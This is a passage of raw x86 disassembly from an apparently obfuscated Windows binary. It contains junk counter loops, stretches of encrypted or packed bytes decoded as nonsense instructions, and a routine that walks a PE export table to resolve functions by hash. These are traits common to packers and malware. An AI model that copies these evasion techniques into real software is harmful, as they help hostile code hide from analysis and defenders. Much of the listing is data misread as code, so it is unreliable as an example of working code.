  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e7dc
  40cec0:	push   0x42e8e3
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42ec43
  40ced0:	cmp    DWORD PTR ds:0x43043d,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x43043d
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x43043d,edi
  40ceea:	mov    edi,DWORD PTR ds:0x43043d
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x43043d,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e7d4,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e7d4,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e7d4,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x43044d
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42ec47
  40cf36:	cmp    DWORD PTR ds:0x42e7d4,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e7d4
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e7d4,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e7d4
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e7d4,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42edef,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e7c4
  40cf7a:	sbb    DWORD PTR ds:0x430435,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x4304db,0x1f
  40cf95:	cmp    DWORD PTR ds:0x4304db,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x4304db,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42eddb
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42ea0f
  40cfbd:	cmp    DWORD PTR ds:0x4304db,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x4304db
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x4304db,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x4304db
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x4304db,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42edf3,0x11
  40cff9:	cmp    DWORD PTR ds:0x42edf3,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42edf3,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e7d8
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42ec4b
  40d024:	cmp    DWORD PTR ds:0x42edf3,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42edf3
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42edf3,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42edf3
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42edf3,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x430439,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x430439
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x430439,esi
  40d067:	cmp    DWORD PTR ds:0x430439,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42ea13
  40d087:	cmp    DWORD PTR ds:0x430439,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42eddb
  40d09f:	sub    DWORD PTR ds:0x42e7bc,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42eddf
  40d0b2:	xor    DWORD PTR ds:0x42ede7,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e7d4
  40d0c3:	or     DWORD PTR ds:0x430441,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42edf3
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x43044d,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42eddb,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x4304eb
  40d0ed:	xor    DWORD PTR ds:0x42eddf,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42edd7,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42edcf
  40d10b:	or     DWORD PTR ds:0x42eddb,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    DWORD PTR ds:0xf9fd2722,ebp
  40d127:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f22
  40d12e:	addr16 in eax,0x1b
  40d131:	into   
  40d132:	enter  0xc4b3,0xf8
  40d136:	scas   eax,DWORD PTR es:[edi]
  40d137:	mov    ebp,0xe4903a55
  40d13c:	enter  0x9ffa,0x8f
  40d140:	inc    edx
  40d141:	pop    edx
  40d142:	cmp    al,0x31
  40d144:	cld    
  40d145:	les    edi,FWORD PTR [eax]
  40d147:	(bad)
  40d14b:	xchg   ebp,eax
  40d14c:	mov    ah,BYTE PTR [edi]
  40d14e:	or     esp,DWORD PTR [ecx+0x7922248c]
  40d154:	push   0x73
  40d156:	js     0x40d129
  40d158:	inc    esp
  40d159:	cmc    
  40d15a:	call   0xb398:0xf74131c8
  40d161:	(bad)  
  40d162:	xchg   ebx,eax
  40d163:	aad    0x62
  40d165:	xchg   ebp,eax
  40d166:	out    dx,al
  40d167:	mov    ds:0xd20c3468,al
  40d16c:	call   0x2c01:0x9c0beb23
  40d173:	pop    eax
  40d174:	mov    dl,0x8b
  40d176:	cmc    
  40d177:	mov    cl,0xf7
  40d179:	outs   dx,DWORD PTR cs:[esi]
  40d17b:	(bad)  
  40d17c:	push   ds
  40d17d:	mov    al,0x28
  40d17f:	and    eax,0x2ce5163b
  40d184:	pop    ds
  40d185:	xchg   esi,eax
  40d186:	inc    esi
  40d187:	add    al,0x74
  40d189:	shl    DWORD PTR [edx],cl
  40d18b:	sbb    DWORD PTR [eax+ebx*8-0x5cf1861a],0x8f287682
  40d196:	sub    dh,ah
  40d198:	(bad)  
  40d199:	cmp    bh,bh
  40d19b:	inc    edi
  40d19c:	inc    esp
  40d19d:	or     DWORD PTR [edi],esp
  40d19f:	(bad)  
  40d1a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1a1:	(bad)  
  40d1a2:	push   esi
  40d1a3:	rcl    BYTE PTR [ebp+0x6073c8e2],1
  40d1a9:	cdq    
  40d1aa:	test   eax,0xccc75d05
  40d1af:	add    al,BYTE PTR [ecx-0x6b]
  40d1b2:	xchg   ebp,eax
  40d1b3:	mov    eax,0x1b8cb87e
  40d1b8:	mov    eax,ds:0x2d4fc36
  40d1bd:	sbb    al,0x36
  40d1bf:	mov    ebx,0x70a18b25
  40d1c4:	cdq    
  40d1c5:	out    0xe4,al
  40d1c7:	cmp    DWORD PTR [ebp+0x2e],0x9eceda47
  40d1ce:	adc    ch,BYTE PTR [edx]
  40d1d0:	sub    bh,ah
  40d1d2:	jnp    0x40d1e5
  40d1d4:	mov    eax,0xd772d5a9
  40d1d9:	cmp    eax,0x4af8825
  40d1de:	pop    esp
  40d1df:	pop    edi
  40d1e0:	call   0x270b3e61
  40d1e5:	pushf  
  40d1e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1e7:	ret    0xd811
  40d1ea:	ds mov ecx,0xd3e058d7
  40d1f0:	or     al,0x7b
  40d1f2:	imul   esi,DWORD PTR [ecx+0x11f5ecc0],0xffffffd6
  40d1f9:	cmp    eax,0xaacea31d
  40d1fe:	xor    BYTE PTR [eax-0x48ebec88],dl
  40d204:	mov    edx,0x7d794d0b
  40d209:	xor    ebp,DWORD PTR [ecx+ecx*4]
  40d20c:	xchg   ecx,eax
  40d20d:	adc    ch,bl
  40d20f:	cs inc esi
  40d211:	scas   eax,DWORD PTR es:[edi]
  40d212:	and    BYTE PTR cs:[ebx+0x78],bh
  40d216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d217:	fadd   DWORD PTR [edi]
  40d219:	test   al,0xcf
  40d21b:	cmp    bh,bl
  40d21d:	sbb    BYTE PTR [ecx+0x20],bl
  40d220:	jo     0x40d253
  40d222:	(bad)  
  40d223:	neg    DWORD PTR [eax]
  40d225:	or     BYTE PTR [edi-0x5],ah
  40d228:	ror    BYTE PTR [esi+0x2a],cl
  40d22b:	adc    al,0x35
  40d22d:	dec    eax
  40d22e:	imul   BYTE PTR [esi+esi*1+0x7c]
  40d232:	push   eax
  40d233:	mov    dl,BYTE PTR ds:0xead651ce
  40d239:	test   DWORD PTR ds:0x652ddc60,0x79f32f84
  40d243:	mov    ebp,0x4c0e9a9
  40d248:	stc    
  40d249:	adc    BYTE PTR [eax+0x54145822],al
  40d24f:	(bad)  
  40d250:	sbb    bh,ah
  40d252:	arpl   di,cx
  40d254:	push   es
  40d255:	rcr    BYTE PTR [ecx],cl
  40d257:	stos   DWORD PTR es:[edi],eax
  40d258:	push   0x3d
  40d25a:	add    ecx,ebx
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x4304e7
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ede7,0x42e7c4
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42edef,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42eddf,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42edd7,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x430439,0x430445
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x4304df
  40d2bf:	add    DWORD PTR ds:0x42edd7,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e96f
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x430465,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x43045d,0x42edd3
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e7c4,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x430449,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x430465,0x43043d
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e7c4,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42edeb,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x430449,0x4304d3
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x430435,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x43044d,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x430461,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x43045d,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x43045d
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x43045d,ecx
  40d38d:	cmp    DWORD PTR ds:0x43045d,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x430441
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42ead3
  40d3b2:	cmp    DWORD PTR ds:0x43045d,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0x656a8e30
  40d410:	push   ecx
  40d411:	ret    0xadbf
  40d414:	mov    ?,WORD PTR [esi+0x7e]
  40d417:	and    bh,BYTE PTR [edi+0x7e]
  40d41a:	jle    0x40d3f4
  40d41c:	push   cs
  40d41d:	nop
  40d41e:	or     al,0x51
  40d420:	into   
  40d421:	jle    0x40d47f
  40d423:	retf   
  40d424:	addps  xmm4,XMMWORD PTR [ebp-0x7b]
  40d428:	xor    eax,0x3a23ca00
  40d42d:	dec    ebx
  40d42e:	pop    ss
  40d42f:	cmp    ecx,DWORD PTR [ebp+0x65]
  40d432:	inc    ecx
  40d433:	cdq    
  40d434:	sar    DWORD PTR [esi+0x36884305],0xed
  40d43b:	adc    eax,0x316f794d
  40d440:	ja     0x40d428
  40d442:	aas    
  40d443:	mov    edi,0xb509728b
  40d448:	push   esp
  40d449:	xor    ch,ch
  40d44b:	call   0xb238fc62
  40d450:	and    dl,BYTE PTR [ecx-0x614599ac]
  40d456:	and    DWORD PTR ds:0x6325873c,ecx
  40d45c:	ss int3 
  40d45e:	mov    ebx,0xddefecae
  40d463:	imul   eax,DWORD PTR es:[edx+0xf8715c5],0xffffffb0
  40d46b:	out    dx,al
  40d46c:	or     al,BYTE PTR [esp+ebx*8-0x6d]
  40d470:	pop    edx
  40d471:	ror    BYTE PTR ds:0xa769530d,0x6f
  40d478:	stos   DWORD PTR es:[edi],eax
  40d479:	mov    BYTE PTR ds:0x35694512,ah
  40d47f:	xor    cl,BYTE PTR [edi+0x39]
  40d482:	jl     0x40d444
  40d484:	ret    
  40d485:	add    dl,BYTE PTR [ecx-0x24]
  40d488:	rcr    cl,cl
  40d48a:	dec    esi
  40d48b:	outs   dx,BYTE PTR ss:[esi]
  40d48d:	sub    BYTE PTR [edi+edx*2+0x5e],dh
  40d491:	push   es
  40d492:	jl     0x40d459
  40d494:	sub    BYTE PTR [edx-0x66161fe2],al
  40d49a:	mov    edx,0x330a1554
  40d49f:	cs popf 
  40d4a1:	mov    dh,0x78
  40d4a3:	mov    bl,0xf0
  40d4a5:	into   
  40d4a6:	mov    ebp,0xed3ccaa0
  40d4ab:	cld    
  40d4ac:	cdq    
  40d4ad:	int    0x65
  40d4af:	adc    al,0x67
  40d4b1:	call   0xb4ac:0xe439b30c
  40d4b8:	in     eax,dx
  40d4b9:	xchg   esi,eax
  40d4bb:	outs   dx,BYTE PTR ds:[esi]
  40d4bc:	mov    ah,0x5a
  40d4be:	xor    ebp,DWORD PTR [edx]
  40d4c0:	aaa    
  40d4c1:	fs or  al,0xc7
  40d4c4:	dec    edi
  40d4c5:	retf   0x4622
  40d4c8:	sar    DWORD PTR [ebp-0x5b],cl
  40d4cb:	mov    bh,0x2c
  40d4cd:	sbb    ch,BYTE PTR [esi+ebx*8-0x39]
  40d4d1:	dec    ebx
  40d4d2:	imul   BYTE PTR [edi+edi*4-0x38]
  40d4d6:	ficom  WORD PTR gs:0x9db9ab0a
  40d4dd:	adc    al,0xae
  40d4df:	mov    ah,BYTE PTR [edx+0x3af524a1]
  40d4e5:	jp     0x40d4b7
  40d4e7:	dec    ebx
  40d4e8:	(bad)  
  40d4e9:	retf   
  40d4ea:	pop    eax
  40d4eb:	gs std 
  40d4ed:	xor    BYTE PTR [edi+0x1c],ch
  40d4f0:	push   ebx
  40d4f1:	out    0xce,eax
  40d4f3:	out    dx,eax
  40d4f4:	jne    0x40d486
  40d4f6:	(bad)  
  40d4f7:	ja     0x40d525
  40d4f9:	rcr    esp,1
  40d4fb:	adc    bh,cl
  40d4fd:	fwait
  40d4fe:	ins    DWORD PTR es:[edi],dx
  40d4ff:	popf   
  40d500:	push   ebp
  40d501:	ror    ch,0x75
  40d504:	cmp    esp,ecx
  40d506:	jo     0x40d4e0
  40d508:	retf   
  40d509:	aam    0x72
  40d50b:	mov    eax,0x3edc9304
  40d510:	ss lock ins DWORD PTR es:[edi],dx
  40d513:	mov    ebx,0x5358ffa1
  40d518:	jmp    0xeeb30e8e
  40d51d:	mov    ah,0x42
  40d51f:	scas   eax,DWORD PTR es:[edi]
  40d520:	mov    al,ds:0xbff6c065
  40d525:	and    eax,0xefa22efa
  40d52a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d52b:	sahf   
  40d52c:	sub    BYTE PTR [ebx],dl
  40d52e:	xor    al,0x8f
  40d530:	jg     0x40d53f
  40d532:	sub    eax,0xee7d4695
  40d537:	mov    edx,0x3731af14
  40d53c:	ret    0x5922
  40d53f:	dec    ecx
  40d540:	rcr    BYTE PTR [ebx],cl
  40d542:	lock ror DWORD PTR [ebp+0x75fffe15],0xc
  40d54a:	call   0x402e68
  40d54f:	mov    eax,DWORD PTR [ebp-0x4]
  40d552:	mov    ecx,DWORD PTR [ebp-0x8]
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	xlat   BYTE PTR ds:[ebx]
  40d5b8:	retf   
  40d5b9:	jmp    0x227e:0x7e8f51b3
  40d5c0:	jg     0x40d640
  40d5c2:	jle    0x40d553
  40d5c4:	out    dx,al
  40d5c5:	xor    eax,0x62605f64
  40d5ca:	(bad)  
  40d5cb:	das    
  40d5cc:	push   esi
  40d5cd:	push   esi
  40d5ce:	shr    DWORD PTR [esp+ecx*4-0x76],0x6
  40d5d3:	push   esp
  40d5d4:	inc    ecx
  40d5d5:	mov    ecx,0x2a24a7e1
  40d5da:	es fsubp st(2),st
  40d5dd:	das    
  40d5de:	and    ah,BYTE PTR [esi-0x1cd5e3af]
  40d5e4:	push   eax
  40d5e5:	xor    DWORD PTR ds:0x5fa17d50,ebx
  40d5eb:	xchg   BYTE PTR [edi+0x60e1b4e4],bh
  40d5f1:	loope  0x40d60c
  40d5f3:	das    
  40d5f4:	fisub  WORD PTR [edx-0x78]
  40d5f7:	sub    dl,dl
  40d5f9:	gs mov dh,0xf3
  40d5fc:	or     al,0x47
  40d5fe:	in     al,0xc0
  40d600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d601:	push   0x8b322c27
  40d606:	pop    ebx
  40d607:	cwde   
  40d608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d609:	sub    ah,BYTE PTR [eax]
  40d60b:	xchg   edi,eax
  40d60c:	sahf   
  40d60d:	mov    DWORD PTR [edx],esp
  40d60f:	ret    0x1837
  40d612:	inc    esi
  40d613:	xchg   ecx,eax
  40d614:	mov    ds:0x4959a90d,eax
  40d619:	cwde   
  40d61a:	inc    esp
  40d61b:	or     bh,BYTE PTR [esi]
  40d61d:	pop    edx
  40d61e:	clc    
  40d61f:	scas   eax,DWORD PTR es:[edi]
  40d620:	or     ebx,edi
  40d622:	dec    ebx
  40d623:	jns    0x40d5d7
  40d625:	rcr    BYTE PTR [edi+0x50],0xf6
  40d629:	mov    edi,DWORD PTR [ecx]
  40d62b:	bound  esi,QWORD PTR [ebp+0x3f]
  40d62e:	cmp    eax,DWORD PTR [edx]
  40d630:	xor    ebx,ebx
  40d632:	inc    ebx
  40d633:	inc    edi
  40d634:	xor    al,0x4f
  40d636:	push   ss
  40d637:	adc    al,0xc5
  40d639:	mov    esi,0xc0268c91
  40d63e:	loopne 0x40d658
  40d640:	(bad)  
  40d641:	(bad)  
  40d642:	outs   dx,DWORD PTR ds:[esi]
  40d643:	pop    edx
  40d644:	cmp    eax,0x5d8b3efa
  40d649:	hlt    
  40d64a:	xor    eax,0x38297b47
  40d64f:	lea    edi,[ebx]
  40d651:	iret   
  40d652:	cmp    BYTE PTR [ecx],al
  40d654:	scas   al,BYTE PTR es:[edi]
  40d655:	add    al,0x43
  40d657:	or     BYTE PTR [ecx],bl
  40d659:	pop    ebx
  40d65a:	pop    ss
  40d65b:	mov    edx,0x6b3365d1
  40d660:	jb     0x40d671
  40d662:	push   esp
  40d663:	sub    ebp,ecx
  40d665:	add    DWORD PTR [edx+0x767ad82d],0x4e775d8a
  40d66f:	push   esi
  40d670:	adc    BYTE PTR [ebx+0x3f],cl
  40d673:	test   al,0xd3
  40d675:	push   ebx
  40d676:	jge    0x40d6d0
  40d678:	fmul   QWORD PTR [ebp-0x776bc643]
  40d67e:	and    ch,BYTE PTR [ecx]
  40d680:	dec    ecx
  40d681:	xchg   esp,eax
  40d682:	test   dl,0x4b
  40d685:	push   ds
  40d686:	mov    cl,0x22
  40d688:	imul   esi,DWORD PTR [eax+0x8],0x73
  40d68c:	fcmovnbe st,st(7)
  40d68e:	fbstp  TBYTE PTR [ebp+0x2409a45c]
  40d694:	ja     0x40d67b
  40d696:	sar    DWORD PTR cs:[ebx+edi*8],0x8a
  40d69b:	push   edx
  40d69c:	and    DWORD PTR [edx-0x1],ecx
  40d69f:	ja     0x40d69e
  40d6a1:	xor    DWORD PTR [esi-0x70e08f37],edx
  40d6a7:	xor    eax,eax
  40d6a9:	xchg   edx,eax
  40d6aa:	xchg   ebx,eax
  40d6ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6ac:	bound  esp,QWORD PTR ss:[edx]
  40d6af:	aas    
  40d6b0:	push   esi
  40d6b1:	mov    al,BYTE PTR [edi-0x79]
  40d6b4:	dec    eax
  40d6b5:	push   ebx
  40d6b6:	scas   eax,DWORD PTR es:[edi]
  40d6b7:	fiadd  WORD PTR [edi-0x3a]
  40d6ba:	icebp  
  40d6bb:	repnz sub eax,0xbc78a557
  40d6c1:	push   edx
  40d6c2:	in     al,dx
  40d6c3:	fs loopne 0x40d65f
  40d6c6:	push   ss
  40d6c7:	mov    al,ds:0x3c5353d
  40d6cc:	sar    DWORD PTR [esp+eiz*2],1
  40d6cf:	mov    DWORD PTR [esi+0x28dfcb2d],edx
  40d6d5:	jo     0x40d66a
  40d6d7:	ja     0x40d757
  40d6d9:	mov    cl,0xba
  40d6db:	stos   DWORD PTR es:[edi],eax
  40d6dc:	mov    edi,0xf9eccff4
  40d6e1:	ins    BYTE PTR es:[edi],dx
  40d6e2:	push   ebp
  40d6e3:	mov    DWORD PTR [eax+edx*1+0x67],ebx
  40d6e7:	cwde   
  40d6e8:	test   eax,0x901c4762
  40d6ed:	test   BYTE PTR [esi+0x35fc458b],0x54
  40d6f4:	or     BYTE PTR [ecx+0x7],dl
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    edi,es
  40d727:	add    dl,bl
  40d729:	scas   eax,DWORD PTR es:[edi]
  40d72a:	add    eax,0x227e7e8d
  40d72f:	jg     0x40d7af
  40d731:	jle    0x40d755
  40d733:	fidiv  WORD PTR [esi]
  40d735:	mov    eax,ds:0xf4b19385
  40d73a:	lock mov dl,BYTE PTR gs:[edx-0x2e259b99]
  40d742:	sub    cl,BYTE PTR [eax-0x6dd3e2aa]
  40d748:	push   es
  40d749:	jle    0x40d77c
  40d74b:	(bad)  
  40d74c:	cmc    
  40d74d:	(bad)  
  40d74e:	repnz int 0x25
  40d751:	push   esp
  40d752:	fdiv   QWORD PTR [ebp+0x613fbde8]
  40d758:	inc    ebp
  40d759:	in     al,dx
  40d75a:	mov    al,ds:0x7b30ec5a
  40d75f:	fcom   st(2)
  40d761:	inc    edi
  40d762:	aam    0x3c
  40d764:	scas   al,BYTE PTR es:[edi]
  40d765:	cwde   
  40d766:	and    eax,0xe0435470
  40d76b:	dec    ah
  40d76d:	stos   DWORD PTR es:[edi],eax
  40d76e:	mov    al,ds:0xe07816c2
  40d773:	adc    BYTE PTR [edi+0x77],bl
  40d776:	scas   eax,DWORD PTR es:[edi]
  40d777:	repz jne 0x40d7b4
  40d77a:	pop    ebp
  40d77b:	ffreep st(1)
  40d77d:	cmp    esi,DWORD PTR [eax+0x16]
  40d780:	test   edx,eax
  40d782:	lahf   
  40d783:	bound  ebp,QWORD PTR [ecx]
  40d785:	inc    ebx
  40d786:	xchg   edi,eax
  40d787:	pop    edi
  40d788:	ins    BYTE PTR es:[edi],dx
  40d789:	mov    BYTE PTR [ebp+0x7a],bl
  40d78c:	add    BYTE PTR [ecx-0x19],dl
  40d78f:	in     al,dx
  40d790:	jge    0x40d7fb
  40d792:	iret   
  40d793:	or     BYTE PTR [ecx-0xb84fc23],dl
  40d799:	push   edi
  40d79a:	xchg   ebp,eax
  40d79b:	idiv   bh
  40d79d:	or     DWORD PTR [esi+0x1],ecx
  40d7a0:	call   0xcee782c
  40d7a5:	mov    ds:0xbe520e28,eax
  40d7aa:	mov    esp,edx
  40d7ac:	mov    cl,0xb4
  40d7ae:	stos   DWORD PTR es:[edi],eax
  40d7af:	jno    0x40d7ce
  40d7b1:	clc    
  40d7b2:	call   0x15aaae94
  40d7b7:	mov    WORD PTR [ebp+edx*2+0x6be78c98],fs
